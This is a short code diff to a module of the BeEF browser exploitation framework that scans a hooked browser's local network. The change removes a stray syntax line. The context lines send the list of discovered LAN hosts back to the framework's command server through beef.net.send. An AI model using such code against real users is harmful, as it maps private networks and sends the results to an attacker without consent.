@@ -109,7 +109,6 @@ var doScan = function(timeout) {
     } else {
       beef.debug("[command #<%= @command_id %>] Identifying LAN hosts completed.");
       beef.net.send('<%= @command_url %>', <%= @command_id %>, 'hosts='+hosts, beef.are.status_success());
-);
       beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=scan complete");
     }
   }
